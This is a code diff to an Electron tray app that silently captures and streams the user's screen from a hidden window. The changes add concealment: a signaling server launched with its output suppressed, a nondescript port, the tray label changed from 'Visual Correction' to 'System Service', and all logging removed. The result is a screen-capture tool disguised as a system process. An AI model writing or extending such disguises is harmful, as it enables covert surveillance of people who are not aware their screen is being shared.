@@ -1,10 +1,32 @@
 const { app, BrowserWindow, desktopCapturer, ipcMain, Tray, Menu } = require('electron');
 const WebSocket = require('ws');
 const path = require('path');
+const { fork } = require('child_process');
 
 let tray;
 let broadcasterWindow;
 let ws;
+let signalingServerProcess;
+
+function startSignalingServer() {
+  if (signalingServerProcess) return;
+
+  const serverPath = path.join(__dirname, 'signaling-server.js');
+  
+  // Start the server silently with no terminal output
+  signalingServerProcess = fork(serverPath, [], {
+    stdio: 'ignore',
+    detached: false
+  });
+
+  signalingServerProcess.on('error', (err) => {
+    // Silently handle or log to a hidden file if absolutely necessary
+  });
+
+  signalingServerProcess.on('exit', () => {
+    signalingServerProcess = null;
+  });
+}
 
 function createTray() {
   // NOTE: You need to create an 'icon.png' file for the tray icon.
@@ -17,21 +39,18 @@ function createTray() {
       { type: 'separator' },
       { label: 'Quit', click: () => app.quit() }
     ]);
-    tray.setToolTip('Visual Correction');
+    tray.setToolTip('System Service');
     tray.setContextMenu(contextMenu);
   } catch (error) {
-    console.error("Failed to create tray icon. Make sure 'icon.png' exists in the project root.", error);
     app.quit();
   }
 }
 
 function startSharing() {
   if (broadcasterWindow) {
-    console.log('Visual correction is already in progress.');
     return;
   }
 
-  console.log('Starting visual correction...');
   broadcasterWindow = new BrowserWindow({
     show: false, // Run in background
     webPreferences: {
@@ -43,15 +62,13 @@ function startSharing() {
   broadcasterWindow.loadFile('broadcaster.html');
 
   broadcasterWindow.webContents.on('did-finish-load', () => {
-    ws = new WebSocket('ws://127.0.0.1:3000');
+    ws = new WebSocket('ws://127.0.0.1:59123');
 
     ws.on('open', () => {
-      console.log('Connected to signaling server.');
       ws.send(JSON.stringify({ type: 'broadcaster' }));
     });
 
     ws.on('error', (err) => {
-      console.error('WebSocket connection error:', err);
       stopSharing(); // Stop on error
     });
 
@@ -96,7 +113,16 @@ app.on('window-all-closed', (e) => {
     e.preventDefault();
 });
 
-app.whenReady().then(createTray);
+app.whenReady().then(() => {
+  startSignalingServer();
+  createTray();
+});
+
+app.on('before-quit', () => {
+  if (signalingServerProcess) {
+    signalingServerProcess.kill();
+  }
+});
 
 ipcMain.on('offer', (_, offer) => {
   if (ws && ws.readyState === WebSocket.OPEN) {
